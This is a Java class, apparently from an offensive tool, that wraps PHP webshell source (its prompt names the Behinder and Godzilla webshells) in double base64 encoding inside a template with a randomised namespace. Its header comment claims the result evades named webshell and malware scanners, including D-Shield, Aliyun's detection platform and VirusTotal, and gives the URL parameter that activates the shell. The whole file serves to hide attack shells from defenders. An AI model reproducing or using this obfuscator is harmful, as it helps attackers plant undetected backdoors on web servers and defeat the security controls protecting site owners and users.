package encode;

import application.RandomString;
import config.Demos;

import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.Random;

public class PhpEncodeDemo7 {
    String tamplate;
    String sourcecode;
    String key;
    String MScode;
    String Describe;
    String namespace;

    public PhpEncodeDemo7() {
    }

    public PhpEncodeDemo7(String tamplate, String sourcecode, String key ) {
        this.tamplate = tamplate;
        this.sourcecode = sourcecode;
        this.key = key;
    }

    public static String GetDescribe(){
        return  "/*\n" +
                " * By: XG小刚\n" +
                " * Time: 2023-12-10_phpdemo7\n" +
                " * Bypass: 牧云、阿里云恶意文件检测平台、河马在线、河马本地(1.8.2)、D盾(2.1.7)、微步(安全)、VT(0红)\n" +
                " * 传参: /xxxx.php?XXXXXX=Application\\TMethod\\M\n" +
                " * 版本: PHP全版本"+
                " */";
    }

    public String[] Run(){
        if(!sourcecode.isEmpty()){
            try {
                sourcecode = sourcecode.replace("<?php", "").replace("?>", "").trim();
                byte[] bytes = sourcecode.getBytes(StandardCharsets.UTF_8);
                String base64code= Base64.getEncoder().encodeToString(Base64.getEncoder().encode(bytes));

                String demo = Demos.phpdemo7;
                if(demo == null){
                    return new String[]{"无该demo配置文件",""};
                }
                MScode = new String(Base64.getDecoder().decode(demo));
                this.namespace = RandomString.getRString(6).toLowerCase();
                MScode = MScode.replace("$namespace$",this.namespace);
                MScode = MScode.replace("$base64code$",base64code);

                Describe = "/*\n" +
                        " * By: XG小刚\n" +
                        " * Time: 2023-12-10_phpdemo7\n" +
                        " * Bypass: 牧云、阿里云恶意文件检测平台、河马在线、河马本地(1.8.2)、D盾(2.1.7)、微步(安全)、VT(0红)\n" +
                        " * 传参: /xxxx.php?"+this.namespace+"=Application\\TMethod\\M\n" +
                        " * 版本: PHP全版本"+
                        " */";

                return new String[]{this.MScode,this.Describe};
            }catch (Exception e){
                return new String[]{"加密失败",this.Describe};
            }
        }else {
            return new String[]{"请输入冰蝎、哥斯拉php源码", this.Describe};
        }
    }
}
